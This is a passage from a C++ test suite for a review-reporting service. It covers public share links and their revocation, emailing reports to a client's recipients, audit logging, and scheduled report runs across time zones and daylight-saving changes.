    ASSERT_TRUE(std::regex_match(url, match, std::regex(R"(https://storage\.test/public/r/([A-Za-z0-9_-]{43})\.html)"))) << url;
    const auto token = match[1].str();
    EXPECT_NE(url, std::string(json(second).at("url").as_string()));
    EXPECT_EQ(json(first).at("origin").as_string(), "manual");
    EXPECT_EQ(json(first).at("created_by").as_string(), "staff@xvisionmediaus.com");

    ASSERT_EQ(public_.objects.size(), 2u);
    const auto& object = public_.objects.at("r/" + token + ".html");
    EXPECT_EQ(object.body, html(id));
    EXPECT_EQ(object.content_type, "text/html; charset=utf-8");
    EXPECT_EQ(object.cache_control, "no-store");
    // A wrong token names nothing: there is no object to read and no route in the engine to ask.
    EXPECT_FALSE(public_.objects.contains("r/" + std::string(43, 'A') + ".html"));

    // The token opens the report, so it is in no audit entry.
    EXPECT_EQ(count("audit_log WHERE action = 'report_share_link.create'"), 2);
    EXPECT_EQ(count(std::format("audit_log WHERE coalesce(before::text, '') || coalesce(after::text, '') LIKE '%{}%'", token)), 0);
    EXPECT_EQ(report(id).at("share_links").as_array().size(), 2u);
}

TEST_F(Reports, RevokingALinkReplacesItsPage) {
    add_review(chelsea_, "a1", 5, "2026-10-05T15:00:00Z", "Lovely words");
    const auto id = generate(spa_client_);
    const auto kept = json(post(std::format("/api/reports/{}/share-links", id)));
    const auto link = json(post(std::format("/api/reports/{}/share-links", id)));
    const auto name = std::string(link.at("url").as_string()).substr(kPublicBase.size());
    ASSERT_THAT(public_.objects.at(name).body, HasSubstr("Lovely words"));

    const auto revoked = post(std::format("/api/report-share-links/{}/revoke", link.at("id").as_int64()));
    ASSERT_EQ(revoked.status, 200u) << revoked.body;
    EXPECT_FALSE(json(revoked).at("revoked_at").is_null());
    // The address still answers, with nothing of the report.
    EXPECT_EQ(public_.objects.at(name).body, domain::render_revoked_page());
    EXPECT_THAT(public_.objects.at(name).body, Not(HasSubstr("Lovely words")));
    // The other link is untouched.
    const auto kept_name = std::string(kept.at("url").as_string()).substr(kPublicBase.size());
    EXPECT_THAT(public_.objects.at(kept_name).body, HasSubstr("Lovely words"));
    EXPECT_EQ(count("audit_log WHERE action = 'report_share_link.revoke'"), 1);

    // Revoking again changes nothing and writes nothing.
    const auto puts = public_.puts;
    EXPECT_EQ(post(std::format("/api/report-share-links/{}/revoke", link.at("id").as_int64())).status, 200u);
    EXPECT_EQ(public_.puts, puts);
    EXPECT_EQ(count("audit_log WHERE action = 'report_share_link.revoke'"), 1);
    EXPECT_EQ(post("/api/report-share-links/999999/revoke").status, 404u);
}

TEST_F(Reports, ALinkIsNotRecordedUnlessItsPageIsInTheBucket) {
    add_review(chelsea_, "a1", 5, "2026-10-05T15:00:00Z", "Lovely");
    const auto id = generate(spa_client_);
    const auto link = json(post(std::format("/api/reports/{}/share-links", id)));

    public_.refuse = true;
    const auto refused = post(std::format("/api/reports/{}/share-links", id));
    EXPECT_EQ(refused.status, 502u);
    EXPECT_EQ(error_code(refused), "storage_failed");
    EXPECT_EQ(count("report_share_links"), 1);
    // And a link is not marked revoked while its page still shows the report.
    const auto not_revoked = post(std::format("/api/report-share-links/{}/revoke", link.at("id").as_int64()));
    EXPECT_EQ(not_revoked.status, 502u);
    EXPECT_EQ(count("report_share_links WHERE revoked_at IS NOT NULL"), 0);
}

TEST_F(Reports, WithoutAPublicBucketNothingCanBeSharedOrSent) {
    add_review(chelsea_, "a1", 5, "2026-10-05T15:00:00Z", "Lovely");
    start(false);
    const auto id = generate(spa_client_);
    EXPECT_EQ(status(id), "draft");  // a report is built all the same
    const auto refused = post(std::format("/api/reports/{}/share-links", id));
    EXPECT_EQ(refused.status, 409u);
    EXPECT_EQ(error_code(refused), "no_public_bucket");
    recipients(spa_client_, R"(["owner@spa.example"])");
    sending_on();
    EXPECT_EQ(error_code(post(std::format("/api/reports/{}/send", id))), "no_public_bucket");
    EXPECT_EQ(status(id), "draft");
}

TEST_F(Reports, OnlyABuiltReportCanBeShared) {
    const auto response = post(std::format("/api/clients/{}/reports", spa_client_),
                               R"({"period_start": "2026-10-01", "period_end": "2026-10-31"})");
    const auto id = json(response).at("id").as_int64();
    EXPECT_EQ(error_code(post(std::format("/api/reports/{}/share-links", id))), "report_not_ready");  // still building
    run_jobs();
    EXPECT_EQ(post(std::format("/api/reports/{}/reject", id)).status, 200u);
    EXPECT_EQ(status(id), "rejected");
    EXPECT_EQ(error_code(post(std::format("/api/reports/{}/share-links", id))), "report_not_ready");
    EXPECT_EQ(error_code(post(std::format("/api/reports/{}/send", id))), "report_not_ready");
    EXPECT_EQ(error_code(post(std::format("/api/reports/{}/reject", id))), "report_not_ready");
    EXPECT_EQ(post("/api/reports/999999/share-links").status, 404u);
    EXPECT_TRUE(public_.objects.empty());
    EXPECT_EQ(count("audit_log WHERE action = 'report.reject'"), 1);
}

// ---- sending ----------------------------------------------------------------------------

TEST_F(Reports, AReportWaitsForAPersonAndGoesToTheClientsRecipientsOnly) {
    const auto review = add_review(chelsea_, "a1", 5, "2026-10-05T15:00:00Z", "WORDS-OF-A-REVIEWER");
    analyze(review, "positive", R"([{"id": "treatment_quality", "polarity": "positive"}])");
    const auto id = generate(spa_client_);
    EXPECT_EQ(status(id), "draft");
    EXPECT_EQ(count("notification_deliveries"), 0);  // building a report tells nobody

    // Sending is off after installation: a send would reach nobody, so it is refused.
    recipients(spa_client_, R"(["owner@spa.example", "manager@spa.example"])");
    recipients(buffet_client_, R"(["owner@buffet.example"])");
    EXPECT_EQ(error_code(post(std::format("/api/reports/{}/send", id))), "sending_off");
    EXPECT_TRUE(public_.objects.empty());

    sending_on();
    const auto sent = post(std::format("/api/reports/{}/send", id));
    ASSERT_EQ(sent.status, 200u) << sent.body;
    EXPECT_EQ(json(sent).at("status").as_string(), "sent");
    EXPECT_EQ(json(sent).at("sent_by").as_string(), "staff@xvisionmediaus.com");
    ASSERT_EQ(json(sent).at("share_links").as_array().size(), 1u);
    EXPECT_EQ(json(sent).at("share_links").at(0).at("origin").as_string(), "email");
    const std::string link(json(sent).at("share_links").at(0).at("url").as_string());
    EXPECT_EQ(public_.objects.at(link.substr(kPublicBase.size())).body, html(id));

    EXPECT_EQ(count("notification_deliveries WHERE event_type = 'client_report'"), 2);
    run_jobs();
    ASSERT_EQ(channel_.sent.size(), 2u);
    std::vector<std::string> to{channel_.sent[0].recipient, channel_.sent[1].recipient};
    std::ranges::sort(to);
    EXPECT_EQ(to, (std::vector<std::string>{"manager@spa.example", "owner@spa.example"}));
    const auto& message = channel_.sent[0];
    EXPECT_EQ(message.subject, "Your Google reviews and visibility report, October 1 to 31, 2026");
    EXPECT_THAT(message.body, HasSubstr("New reviews: 1"));
    EXPECT_THAT(message.body, HasSubstr("Praised most: Treatment quality"));
    EXPECT_THAT(message.body, HasSubstr(link));
    // A client is not sent to the dashboard, and no review text is in an email.
    EXPECT_THAT(message.body, Not(HasSubstr("dashboard")));
    EXPECT_THAT(message.body, Not(HasSubstr("WORDS-OF-A-REVIEWER")));
    EXPECT_EQ(count("audit_log WHERE action = 'report.send' AND actor = 'staff@xvisionmediaus.com'"), 1);

    // A sent report is sent once, and stays as it is.
    EXPECT_EQ(error_code(post(std::format("/api/reports/{}/send", id))), "report_not_ready");
    EXPECT_EQ(error_code(post(std::format("/api/reports/{}/reject", id))), "report_not_ready");
    EXPECT_EQ(channel_.sent.size(), 2u);
    // It can still be shared by hand, and its email link revoked.
    EXPECT_EQ(post(std::format("/api/reports/{}/share-links", id)).status, 201u);
}

TEST_F(Reports, AClientWithoutRecipientsCannotBeSentAReport) {
    add_review(chelsea_, "a1", 5, "2026-10-05T15:00:00Z", "Lovely");
    const auto id = generate(spa_client_);
    sending_on();
    recipients(buffet_client_, R"(["owner@buffet.example"])");  // another client's list is not this client's
    EXPECT_EQ(error_code(post(std::format("/api/reports/{}/send", id))), "no_recipients");
    // A rule that is switched off names nobody.
    recipients(spa_client_, R"(["owner@spa.example"])");
    exec(std::format("UPDATE notification_rules SET enabled = false WHERE client_id = {}", spa_client_));
    EXPECT_EQ(error_code(post(std::format("/api/reports/{}/send", id))), "no_recipients");
    EXPECT_EQ(status(id), "draft");
    EXPECT_TRUE(public_.objects.empty());
    EXPECT_EQ(count("notification_deliveries"), 0);
}

TEST_F(Reports, ARuleForClientReportsMustNameAClient) {
    const auto all = post("/api/notification-rules", R"({"event_type": "client_report", "recipients": ["everyone@example.com"]})");
    EXPECT_EQ(all.status, 400u) << all.body;
    EXPECT_THAT(all.body, HasSubstr("must name the client"));
    // The database holds the same rule, whatever the code does.
    EXPECT_THROW(exec("INSERT INTO notification_rules (event_type, recipients, created_at, updated_at) "
                      "VALUES ('client_report', '[\"x@example.com\"]', now(), now())"),
                 pqxx::check_violation);
}

TEST_F(Reports, AnArchivedClientIsSentNothing) {
    add_review(chelsea_, "a1", 5, "2026-10-05T15:00:00Z", "Lovely");
    const auto id = generate(spa_client_);
    recipients(spa_client_, R"(["owner@spa.example"])");
    sending_on();
    exec(std::format("UPDATE clients SET archived = true WHERE id = {}", spa_client_));
    EXPECT_EQ(error_code(post(std::format("/api/reports/{}/send", id))), "client_archived");
    EXPECT_EQ(count("notification_deliveries"), 0);
    EXPECT_TRUE(public_.objects.empty());
}

TEST_F(Reports, AReportWithALinkThatWorksCannotBeRejected) {
    add_review(chelsea_, "a1", 5, "2026-10-05T15:00:00Z", "Lovely");
    const auto id = generate(spa_client_);
    const auto link = json(post(std::format("/api/reports/{}/share-links", id)));
    // Rejected, its page would stay readable under the link.
    const auto refused = post(std::format("/api/reports/{}/reject", id));
    EXPECT_EQ(refused.status, 409u);
    EXPECT_EQ(error_code(refused), "report_shared");
    EXPECT_EQ(status(id), "draft");
    ASSERT_EQ(post(std::format("/api/report-share-links/{}/revoke", link.at("id").as_int64())).status, 200u);
    EXPECT_EQ(post(std::format("/api/reports/{}/reject", id)).status, 200u);
}

TEST_F(Reports, AReportWhoseJobIsGoneDoesNotStayBuildingForEver) {
    const auto response = post(std::format("/api/clients/{}/reports", spa_client_),
                               R"({"period_start": "2026-10-01", "period_end": "2026-10-31"})");
    const auto id = json(response).at("id").as_int64();
    // The engine stopped during the job's last attempt: the job is gone and nothing will finish the report.
    exec("DELETE FROM jobs WHERE kind = 'reports.build'");
    clock_.advance(59min);
    await(reporter_->start_due());
    EXPECT_EQ(status(id), "building");
    clock_.advance(2min);
    await(reporter_->start_due());
    const auto failed = report(id);
    EXPECT_EQ(failed.at("status").as_string(), "failed");
    EXPECT_THAT(std::string(failed.at("error").as_string()), HasSubstr("did not finish"));
    EXPECT_EQ(post(std::format("/api/reports/{}/reject", id)).status, 200u);
}

TEST_F(Reports, AnAutoSendThatBreaksOffLeavesTheReportWaitingWithTheReason) {
    add_review(chelsea_, "a1", 5, "2026-11-09T15:00:00Z", "Lovely");
    recipients(spa_client_, R"(["owner@spa.example"])");
    sending_on();
    schedule(spa_client_, R"("frequency": "daily", "time": "09:00", "time_zone": "America/New_York", "auto_send": true)");
    clock_.advance(2h);
    ASSERT_EQ(await(reporter_->start_due()), 1);
    // The connection to the bucket drops: no answer, an exception.
    public_.unreachable = true;
    run_jobs();
    const auto made = read(std::format("/api/reports?client_id={}", spa_client_)).at("items").at(0);
    EXPECT_EQ(made.at("status").as_string(), "draft");
    EXPECT_THAT(std::string(made.at("hold_reason").as_string()), HasSubstr("Sending failed"));
    EXPECT_TRUE(channel_.sent.empty());
    EXPECT_EQ(count("notification_deliveries"), 0);
    // The job is done: it is not run again, and nothing is sent later behind anyone's back.
    public_.unreachable = false;
    clock_.advance(2h);
    run_jobs();
    EXPECT_TRUE(channel_.sent.empty());
    EXPECT_EQ(status(made.at("id").as_int64()), "draft");
    // A person sends it.
    EXPECT_EQ(post(std::format("/api/reports/{}/send", made.at("id").as_int64())).status, 200u);
}

TEST_F(Reports, AFailedUploadSendsNothing) {
    add_review(chelsea_, "a1", 5, "2026-10-05T15:00:00Z", "Lovely");
    const auto id = generate(spa_client_);
    recipients(spa_client_, R"(["owner@spa.example"])");
    sending_on();
    public_.refuse = true;
    const auto refused = post(std::format("/api/reports/{}/send", id));
    EXPECT_EQ(refused.status, 502u);
    EXPECT_EQ(status(id), "draft");
    EXPECT_EQ(count("notification_deliveries"), 0);
    EXPECT_EQ(count("report_share_links"), 0);
}

// ---- schedules --------------------------------------------------------------------------

TEST_F(Reports, AScheduleBuildsOneReportPerRunInItsOwnTimeZone) {
    // The clock: 2026-11-10 12:00 UTC, which is 07:00 in New York. A daily schedule at 09:00.
    const auto id = schedule(spa_client_, R"("frequency": "daily", "time": "09:00", "time_zone": "America/New_York")");
    EXPECT_EQ(await(reporter_->start_due()), 0);  // 09:00 has not come
    clock_.advance(2h);
    EXPECT_EQ(await(reporter_->start_due()), 1);
    EXPECT_EQ(await(reporter_->start_due()), 0);  // once per run, however often the job looks
    run_jobs();

    const auto listed = read(std::format("/api/reports?client_id={}", spa_client_));
    ASSERT_EQ(listed.at("total").as_int64(), 1);
    const auto& made = listed.at("items").at(0);
    EXPECT_EQ(made.at("period_start").as_string(), "2026-11-09");
    EXPECT_EQ(made.at("period_end").as_string(), "2026-11-09");
    EXPECT_EQ(made.at("schedule_id").as_int64(), id);
    EXPECT_TRUE(made.at("requested_by").is_null());
    EXPECT_EQ(made.at("status").as_string(), "draft");  // it waits for a person
    EXPECT_EQ(listed_schedule(id).at("last_run_on").as_string(), "2026-11-10");
    EXPECT_EQ(count("audit_log WHERE action = 'report.create' AND actor = 'system:report-schedule'"), 1);

    // The next day, once.
    clock_.advance(24h);
    EXPECT_EQ(await(reporter_->start_due()), 1);
    EXPECT_EQ(await(reporter_->start_due()), 0);
    // After a long stop only the latest run is made up for.
    clock_.advance(24h * 5);
    EXPECT_EQ(await(reporter_->start_due()), 1);
    EXPECT_EQ(count("reports"), 3);
    EXPECT_EQ(value<std::string>("SELECT period_start::text FROM reports ORDER BY id DESC LIMIT 1"), "2026-11-15");
}

TEST_F(Reports, AScheduleMadeOrChangedAfterItsTimeDoesNotRunForIt) {
    clock_.advance(3h);  // 10:00 in New York
    const auto id = schedule(spa_client_, R"("frequency": "daily", "time": "09:00", "time_zone": "America/New_York")");
    EXPECT_EQ(await(reporter_->start_due()), 0);
    // Moved to 08:00 at 10:30: no run today for a time that has passed.
    clock_.advance(30min);
    ASSERT_EQ(patch(std::format("/api/report-schedules/{}", id), R"({"time": "08:00"})").status, 200u);
    EXPECT_EQ(await(reporter_->start_due()), 0);
    clock_.advance(24h);
    EXPECT_EQ(await(reporter_->start_due()), 1);
}

TEST_F(Reports, WeeklyAndMonthlySchedulesCoverTheWeekAndTheMonthBefore) {
    schedule(spa_client_, R"("frequency": "weekly", "weekday": 3, "time": "08:00", "time_zone": "America/New_York")");
    schedule(buffet_client_, R"("frequency": "monthly", "month_day": 5, "time": "09:00", "time_zone": "America/New_York")");
    // Wednesday November 11 at 08:00 in New York, then December 5.
    clock_.set(test::t0() + 25h);
    EXPECT_EQ(await(reporter_->start_due()), 1);
    EXPECT_EQ(value<std::string>("SELECT period_start::text || '..' || period_end::text FROM reports ORDER BY id DESC LIMIT 1"),
              "2026-11-04..2026-11-10");
    clock_.set(core::TimePoint(std::chrono::sys_days{std::chrono::year{2026} / 12 / 5} + 14h));
    EXPECT_EQ(await(reporter_->start_due()), 2);  // the monthly one, and the weekly one's latest run
    EXPECT_EQ(value<std::string>(std::format(
                  "SELECT period_start::text || '..' || period_end::text FROM reports WHERE client_id = {} ORDER BY id DESC LIMIT 1",
                  buffet_client_)),
              "2026-11-01..2026-11-30");
}

TEST_F(Reports, ADailyScheduleRunsOnceOnTheDaysClocksChange) {
    // 01:30 in New York exists twice on 2026-11-01 and 02:30 does not exist on 2027-03-14.
    schedule(spa_client_, R"("frequency": "daily", "time": "01:30", "time_zone": "America/New_York")");
    schedule(buffet_client_, R"("frequency": "daily", "time": "02:30", "time_zone": "America/New_York")");
    exec("UPDATE report_schedules SET created_at = '2026-10-01T00:00:00Z', updated_at = '2026-10-01T00:00:00Z'");
    const auto at = [](int y, unsigned m, unsigned d, std::chrono::minutes time) {
        return core::TimePoint(std::chrono::sys_days{std::chrono::year{y} / m / d} + time);
    };
    const auto runs = [&](std::int64_t client) { return count(std::format("reports WHERE client_id = {}", client)); };

    clock_.set(at(2026, 11, 1, 5h + 29min));
    await(reporter_->start_due());  // the runs of October 31, to start from a known state
    const auto spa_before = runs(spa_client_);
    clock_.set(at(2026, 11, 1, 5h + 30min));  // the first 01:30 (EDT)
    await(reporter_->start_due());
    EXPECT_EQ(runs(spa_client_), spa_before + 1);
    clock_.set(at(2026, 11, 1, 6h + 30min));  // the second 01:30 (EST): no second report
    await(reporter_->start_due());
    EXPECT_EQ(runs(spa_client_), spa_before + 1);

    clock_.set(at(2027, 3, 14, 6h + 59min));
    await(reporter_->start_due());
    const auto buffet_before = runs(buffet_client_);
    clock_.set(at(2027, 3, 14, 7h));  // 03:00 EDT, the first moment after the gap
    await(reporter_->start_due());
    EXPECT_EQ(runs(buffet_client_), buffet_before + 1);
    EXPECT_EQ(value<std::string>(std::format("SELECT period_start::text FROM reports WHERE client_id = {} ORDER BY id DESC LIMIT 1",
                                             buffet_client_)),
              "2027-03-13");
}

TEST_F(Reports, AScheduleSendsByItselfOnlyWhereAPersonSaidSo) {
    add_review(chelsea_, "a1", 5, "2026-11-09T15:00:00Z", "Lovely");
    recipients(spa_client_, R"(["owner@spa.example"])");
    sending_on();
    const auto id = schedule(spa_client_, R"("frequency": "daily", "time": "09:00", "time_zone": "America/New_York", "auto_send": true)");
    EXPECT_TRUE(listed_schedule(id).at("auto_send").as_bool());
    clock_.advance(2h);
    ASSERT_EQ(await(reporter_->start_due()), 1);
    run_jobs();

    const auto made = read(std::format("/api/reports?client_id={}", spa_client_)).at("items").at(0);
    EXPECT_EQ(made.at("status").as_string(), "sent");
    EXPECT_TRUE(made.at("sent_by").is_null());  // its schedule
    ASSERT_EQ(channel_.sent.size(), 1u);
    EXPECT_EQ(channel_.sent[0].recipient, "owner@spa.example");
    EXPECT_THAT(channel_.sent[0].body, HasSubstr(std::string(kPublicBase) + "r/"));
    EXPECT_EQ(count("audit_log WHERE action = 'report.send' AND actor = 'system:report-schedule'"), 1);
}

TEST_F(Reports, AReportItsScheduleCouldNotSendWaitsWithTheReason) {
    recipients(spa_client_, R"(["owner@spa.example"])");
    schedule(spa_client_, R"("frequency": "daily", "time": "09:00", "time_zone": "America/New_York", "auto_send": true)");
    clock_.advance(2h);  // sending is still off
    ASSERT_EQ(await(reporter_->start_due()), 1);
    run_jobs();
    const auto made = read(std::format("/api/reports?client_id={}", spa_client_)).at("items").at(0);
    EXPECT_EQ(made.at("status").as_string(), "draft");
    EXPECT_THAT(std::string(made.at("hold_reason").as_string()), HasSubstr("Email sending is switched off"));
    EXPECT_TRUE(channel_.sent.empty());
    EXPECT_TRUE(public_.objects.empty());
    // A person can send it once sending is on.
    sending_on();
    EXPECT_EQ(post(std::format("/api/reports/{}/send", made.at("id").as_int64())).status, 200u);
    EXPECT_TRUE(report(made.at("id").as_int64()).at("hold_reason").is_null());
}

TEST_F(Reports, ADisabledScheduleAndAnArchivedClientRunNothing) {
    const auto off = schedule(spa_client_, R"("frequency": "daily", "time": "09:00", "time_zone": "America/New_York", "enabled": false)");
    schedule(buffet_client_, R"("frequency": "daily", "time": "09:00", "time_zone": "America/New_York")");
    exec(std::format("UPDATE clients SET archived = true WHERE id = {}", buffet_client_));
    clock_.advance(2h);
    EXPECT_EQ(await(reporter_->start_due()), 0);
    // Switched on at 09:00 sharp or later: its next run is tomorrow's.
    ASSERT_EQ(patch(std::format("/api/report-schedules/{}", off), R"({"enabled": true})").status, 200u);
    EXPECT_EQ(await(reporter_->start_due()), 0);
    clock_.advance(24h);
    EXPECT_EQ(await(reporter_->start_due()), 1);
}

TEST_F(Reports, SchedulesAreMadeChangedAndDeletedByPeople) {
    const auto bad = [&](const std::string& rest) {
        return post("/api/report-schedules", std::format(R"({{"client_id": {}, {}}})", spa_client_, rest)).status;
    };
    EXPECT_EQ(bad(R"("frequency": "hourly", "time": "09:00", "time_zone": "America/New_York")"), 400u);
    EXPECT_EQ(bad(R"("frequency": "weekly", "time": "09:00", "time_zone": "America/New_York")"), 400u);  // no weekday
    EXPECT_EQ(bad(R"("frequency": "monthly", "month_day": 31, "time": "09:00", "time_zone": "America/New_York")"), 400u);
    EXPECT_EQ(bad(R"("frequency": "daily", "time": "25:00", "time_zone": "America/New_York")"), 400u);
    EXPECT_EQ(bad(R"("frequency": "daily", "time": "09:00", "time_zone": "Eastern")"), 400u);
    EXPECT_EQ(post("/api/report-schedules", R"({"client_id": 999999, "frequency": "daily", "time": "09:00", "time_zone": "UTC"})").status,
              404u);

    const auto id = schedule(spa_client_, R"("frequency": "weekly", "weekday": 1, "time": "08:30", "time_zone": "America/New_York")");
    auto made = listed_schedule(id);
    EXPECT_EQ(made.at("time").as_string(), "08:30");
    EXPECT_EQ(made.at("weekday").as_int64(), 1);
    EXPECT_FALSE(made.at("auto_send").as_bool());  // off unless a person says otherwise
    EXPECT_TRUE(made.at("enabled").as_bool());
    // A second schedule for the same client is fine.
    schedule(spa_client_, R"("frequency": "monthly", "month_day": 5, "time": "09:00", "time_zone": "America/New_York")");
    EXPECT_EQ(read("/api/report-schedules").at("total").as_int64(), 2);

    // Weekly to monthly: the weekday goes, the day of the month is needed.
    EXPECT_EQ(patch(std::format("/api/report-schedules/{}", id), R"({"frequency": "monthly"})").status, 400u);
    const auto changed = patch(std::format("/api/report-schedules/{}", id), R"({"frequency": "monthly", "month_day": 10, "auto_send": true})");
    ASSERT_EQ(changed.status, 200u) << changed.body;
    EXPECT_TRUE(json(changed).at("weekday").is_null());
    EXPECT_EQ(json(changed).at("month_day").as_int64(), 10);
    EXPECT_EQ(count("audit_log WHERE action = 'report_schedule.update'"), 1);
    // The same values again: nothing changed, nothing recorded.
    EXPECT_EQ(patch(std::format("/api/report-schedules/{}", id), R"({"auto_send": true})").status, 200u);
    EXPECT_EQ(count("audit_log WHERE action = 'report_schedule.update'"), 1);

    EXPECT_EQ(call(verb::delete_, std::format("/api/report-schedules/{}", id), browser_).status, 204u);
    EXPECT_TRUE(listed_schedule(id).is_null());
    EXPECT_EQ(call(verb::delete_, std::format("/api/report-schedules/{}", id), browser_).status, 404u);
    EXPECT_EQ(count("audit_log WHERE action = 'report_schedule.delete'"), 1);
}

TEST_F(Reports, ADeletedScheduleLeavesItsReports) {
    const auto id = schedule(spa_client_, R"("frequency": "daily", "time": "09:00", "time_zone": "America/New_York")");
    clock_.advance(2h);
    ASSERT_EQ(await(reporter_->start_due()), 1);
    run_jobs();
    EXPECT_EQ(call(verb::delete_, std::format("/api/report-schedules/{}", id), browser_).status, 204u);
    const auto listed = read("/api/reports");
    ASSERT_EQ(listed.at("total").as_int64(), 1);
    EXPECT_TRUE(listed.at("items").at(0).at("schedule_id").is_null());
    EXPECT_EQ(read("/api/reports?status=draft").at("total").as_int64(), 1);
    EXPECT_EQ(read("/api/reports?status=sent").at("total").as_int64(), 0);
}
